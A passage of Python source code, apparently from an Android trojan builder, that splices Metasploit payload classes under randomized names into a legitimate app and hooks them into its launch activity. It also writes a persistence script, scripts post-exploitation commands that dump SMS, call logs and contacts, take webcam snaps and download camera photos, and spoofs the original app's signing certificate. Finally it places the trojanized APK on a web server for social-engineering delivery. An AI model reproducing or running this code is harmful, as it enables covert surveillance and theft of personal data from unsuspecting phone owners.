                'cd ' + dir_PLD + '/smali/com/metasploit/stage/ && cp f.smali e.smali d.smali c.smali b.smali a.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/Payload.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/' + rnd_Payload + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainService.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/' + rnd_MainService + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainBroadcastReceiver.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '.smali',
                shell=True)
            subprocess.call(
                'sed -i "s#metasploit/stage#' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/*;sed -i "s#Payload#' + rnd_Payload + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/*;sed -i "s#MainService#' + rnd_stage + '/' + rnd_MainService + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/*;sed -i "s#MainBroadcastReceiver#' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '.' + dir_package_app_for + '/' + rnd_stage + '/*',
                shell=True)
        else:
            return
    print "I: Finding launcher address..."
    subprocess.call(
        "PACKAGE_FINDER=$(awk '/package=/{ print NR }' " + Android_Manifest + ") && sed -n \"$PACKAGE_FINDER\"p " + Android_Manifest + " > " + addr_package,
        shell=True)
    subprocess.call(
        "grep -o 'package=\"[^\"]*' " + addr_package + " > " + addr_package_Modify,
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(package="\|name\|=\"\)//g\' ' + addr_package_Modify,
        shell=True)
    subprocess.call(
        "tr '.' '/' <" + addr_package_Modify + " >" + addr_package_Fixed,
        shell=True)
    subprocess.call(
        "ALLOWBACKUP_FINDER=$(awk '/android:allowBackup=/{ print NR }' " + Android_Manifest + ") && sed -n \"$ALLOWBACKUP_FINDER\"p " + Android_Manifest + " > " + addr_allowBackup,
        shell=True)
    subprocess.call(
        "grep -o 'android:name=\"[^\"]*' " + addr_allowBackup + " > " + addr_allowBackup_Modify,
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(android:\|name\|=\"\)//g\' ' + addr_allowBackup_Modify,
        shell=True)
    subprocess.call(
        "tr '.' '/' <" + addr_allowBackup_Modify + " >" + addr_allowBackup_Fixed,
        shell=True)
    subprocess.call(
        "MAIN_ACTIVITY=$(awk '/category.LAUNCHER/{ print NR - 3 }' " + Android_Manifest + ") && sed -n \"$MAIN_ACTIVITY\"p " + Android_Manifest + " > " + addr_Activity,
        shell=True)
    with open(addr_Activity) as f:
        if 'android:name=' in f.read():
            pass
        else:
            subprocess.call(
                "MAIN_ACTIVITY=$(awk '/category.LAUNCHER/{ print NR - 4 }' " + Android_Manifest + ") && sed -n \"$MAIN_ACTIVITY\"p " + Android_Manifest + " > " + addr_Activity,
                shell=True)
    subprocess.call(
        "grep -o 'android:name=\"[^\"]*' " + addr_Activity + " > " + addr_Activity_Modify,
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(android:\|name\|=\"\)//g\' ' + addr_Activity_Modify,
        shell=True)
    subprocess.call(
        "tr '.' '/' <" + addr_Activity_Modify + " >" + addr_Activity_Fixed,
        shell=True)
    print "I: Hooking service launcher..."
    check_addr_allowBackup = os.path.exists(addr_allowBackup_Fixed)
    if check_addr_allowBackup == (False):
        subprocess.call(
            "APP_LAUNCHER=$(cat " + addr_Activity_Fixed + ") && sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a " + Backslash + "n\ \ \ \ invoke-static \{p0\}, Lcom/'" + rnd_Payload + "'\/'" + rnd_Payload + "'\/'" + rnd_MainService + "'\;->start(Landroid\/content\/Context;)V' " + dir_ORG + "/smali/\"$APP_LAUNCHER\".smali",
            shell=True)
    else:
        check_addr_Activity = os.path.exists(addr_Activity_Fixed)
        if check_addr_Activity == (False):
            subprocess.call(
                "APP_LAUNCHER=$(cat " + addr_allowBackup_Fixed + ") && LAUNCHER_STARTER=$(awk '/sput-object p0/{ print NR + 3 }' " + Android_Manifest + ") && sed -i '\"$LAUNCHER_STARTER\"s/.*/    invoke-static {}, Lcom/" + dir_package_app_two + "/" + dir_package_app_tree + "/" + rnd_stage + "/" + rnd_MainService + ";->start()V\n\n    return-void' " + dir_ORG + '/smali/' + "\"$APP_LAUNCHER\".smali",
                shell=True)
        else:
            return
    print "I: Generating Persistence..."
    subprocess.call(
        'SHELL="#!" && echo "$SHELL/bin/bash" > /usr/share/AndTroj/tmp/persis.sh;echo "while true" >> /usr/share/AndTroj/tmp/persis.sh;echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> /usr/share/AndTroj/tmp/persis.sh;echo "sleep 600" >> /usr/share/AndTroj/tmp/persis.sh;echo "done" >> /usr/share/AndTroj/tmp/persis.sh',
        shell=True)
    subprocess.call(
        'ADDR_PACKAGE=$(cat ' + addr_package_Modify + ') && sed -i "s#com.metasploit.stage#"$ADDR_PACKAGE"#" ' + Persistence + ';ADDR_ACTIVITY=$(cat ' + addr_Activity_Modify + ') && sed -i "s#.MainActivity#"$ADDR_ACTIVITY"#" ' + Persistence,
        shell=True)
    print "I: Generating Post exploitation..."
    subprocess.call(
        'echo "upload ' + Persistence + '" > ' + tmp + 'autoand.rc;echo "execute -f \"sh persis.sh\"" >> ' + tmp + 'autoand.rc;echo "sysinfo" >> ' + tmp + 'autoand.rc;echo "check_root" >> ' + tmp + 'autoand.rc;echo "getwd" >> ' + tmp + 'autoand.rc;echo "route" >> ' + tmp + 'autoand.rc;echo "geolocate" >> ' + tmp + 'autoand.rc;echo "screenshot" >> ' + tmp + 'autoand.rc;echo "dump_calllog" >> ' + tmp + 'autoand.rc;echo "dump_sms" >> ' + tmp + 'autoand.rc;echo "dump_contacts" >> ' + tmp + 'autoand.rc;echo "webcam_snap" >> ' + tmp + 'autoand.rc;echo "cd ../../../../../" >> ' + tmp + 'autoand.rc;echo "cd /sdcard/DCIM/Camera" >> ' + tmp + 'autoand.rc;echo "download -r *" >> ' + tmp + 'autoand.rc',
        shell=True)
    print "I: Recompiling original and outputing..."
    subprocess.call(
        'apktool -a /usr/bin/aapt b ' + dir_ORG,
        shell=True)
    print "I: Signing Spoofing cert apk..."
    subprocess.call(
        'keytool -J-Duser.language=en -printcert -jarfile ' + payload_n + '.apk | grep -o \'Owner: [^"]*\' > ' + addr_Owner,
        shell=True)
    subprocess.call(
        'keytool -J-Duser.language=en -printcert -jarfile ' + payload_n + '.apk | grep -o \'Valid from: [^"]*\' >> ' + addr_Owner,
        shell=True)
    subprocess.call(
        'keytool -J-Duser.language=en -printcert -jarfile ' + payload_n + '.apk | grep -o \'Subject Public Key Algorithm: [^"]*\' >> ' + addr_Owner,
        shell=True)
    subprocess.call(
        "sed -i 's#Subject Public Key Algorithm: ##g' " + addr_Owner + ";sed -i 's#-bit RSA key##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'C=[^\"]*' > " + addr_dname + ";cat " + addr_Owner + " | grep -o 'ST=[^\"]*,' >> " + addr_dname,
        shell=True)
    with open(addr_dname) as d:
        line_one = d.readlines()[0]
        line_one_fixed = line_one.split('\n', 1)[0]
    with open(addr_dname) as d:
        line_two = d.readlines()[1]
        line_two_fixed = line_two.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_one_fixed + "##g' " + addr_Owner + ";sed -i 's#" + line_two_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'L=[^\"]*' >> " + addr_dname,
        shell=True)
    with open(addr_dname) as d:
        line_tree = d.readlines()[2]
        line_tree_fixed = line_tree.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_tree_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'O=[^\"]*' >> " + addr_dname,
        shell=True)
    with open(addr_dname) as d:
        line_for = d.readlines()[3]
        line_for_fixed = line_for.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_for_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'OU=[^\"]*' >> " + addr_dname,
        shell=True)
    with open(addr_dname) as d:
        line_five = d.readlines()[4]
        line_five_fixed = line_five.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_five_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'CN=[^\"]*' >> " + addr_dname,
        shell=True)
    with open(addr_dname) as d:
        line_six = d.readlines()[5]
        line_six_fixed = line_six.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_six_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'EMAILADDRESS=[^\"]*' >> " + addr_dname + ";sed -i 's#,##g' " + addr_dname,
        shell=True)
    subprocess.call(
        "cat " + addr_Owner + " | grep -o 'EDT [^\"]* u' >> " + addr_EDT + ";cat " + addr_Owner + " | grep -o 'EST [^\"]* u' >> " + addr_EDT,
        shell=True)
    with open(addr_EDT) as e:
        line_EDT = e.readlines()[0]
        line_EDT_fixed = line_EDT.split('\n', 1)[0]
    subprocess.call(
        "sed -i 's#" + line_EDT_fixed + "##g' " + addr_Owner + ";cat " + addr_Owner + " | grep -o 'EDT [^\"]*' >> " + addr_EDT + ";cat " + addr_Owner + " | grep -o 'EST [^\"]*' >> " + addr_EDT + ";sed -i 's#EDT##g' " + addr_EDT + ";sed -i 's#EST##g' " + addr_EDT + ";sed -i 's#u##g' " + addr_EDT + ";sed -i 's# ##g' " + addr_EDT,
        shell=True)
    with open(addr_dname) as d:
        line_0 = d.readlines()[0]
        line_0_fixed = line_0.split('\n', 1)[0]
        C_0 = line_0_fixed
    with open(addr_dname) as d:
        line_1 = d.readlines()[1]
        line_1_fixed = line_1.split('\n', 1)[0]
        ST_1 = line_1_fixed + ','
    with open(addr_dname) as d:
        line_2 = d.readlines()[2]
        line_2_fixed = line_2.split('\n', 1)[0]
        L_2 = line_2_fixed + ','
    with open(addr_dname) as d:
        line_3 = d.readlines()[3]
        line_3_fixed = line_3.split('\n', 1)[0]
        O_3 = line_3_fixed + ','
    with open(addr_dname) as d:
        line_4 = d.readlines()[4]
        line_4_fixed = line_4.split('\n', 1)[0]
        OU_4 = line_4_fixed + ','
    with open(addr_dname) as d:
        line_5 = d.readlines()[5]
        line_5_fixed = line_5.split('\n', 1)[0]
        CN_5 = line_5_fixed + ','
    with open(addr_dname) as d:
        line_6 = d.readlines()[6]
        line_6_fixed = line_6.split('\n', 1)[0]
        EMAILADDRESS_6 = line_6_fixed + ','
    with open(addr_EDT) as e:
        line_7 = e.readlines()[0]
        line_7_fixed = line_7.split('\n', 1)[0]
    with open(addr_EDT) as e:
        line_8 = e.readlines()[1]
        line_8_fixed = line_8.split('\n', 1)[0]
    with open(addr_Owner) as o:
        line_9 = o.readlines()[2]
        line_9_fixed = line_9.split('\n', 1)[0]
    subprocess.call(
        'keytool -genkey -v -keystore ' + tmp + 'unk9vvn.keystore -alias signing.key -storepass 12341234 -keypass 12341234 -keyalg RSA -keysize ' + line_9_fixed + ' -startdate ' + line_7_fixed + '/01/01 -validity ' + line_8_fixed + ' -dname "' + EMAILADDRESS_6 + ' ' + CN_5 + ' ' + OU_4 + ' ' + O_3 + ' ' + L_2 + ' ' + ST_1 + ' ' + C_0 + '"',
        shell=True)
    subprocess.call(
        'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ' + tmp + 'unk9vvn.keystore ' + dir_ORG + '/dist/orgapp.apk signing.key -storepass 12341234',
        shell=True)
    subprocess.call(
        'mv {0}/dist/orgapp.apk {1}-b.apk'.format(dir_ORG, payload_name),
        shell=True)
    print "I: Clear data templates..."
    subprocess.call(
        'cd ' + tmp + ' && rm addr_PKG.txt addr_PKG_MDY.txt addr_PKG_FIX.txt addr_ALW.txt addr_ALW_MDY.txt addr_ALW_FIX.txt addr_ACT.txt addr_ACT_MDY.txt addr_ACT_BK_FIX.txt dir_IN_APK.txt addr_Owner.txt addr_EDT.txt addr_dname.txt',
        shell=True)
    print "I: Trojan apk Copying webserver..."
    subprocess.call(
        'cp ' + payload_name + '-b.apk /var/www/html/',
        shell=True)
    print "I: Outputing on /root/" + payload_name + "-b.apk\n"
    social_eng_menu()
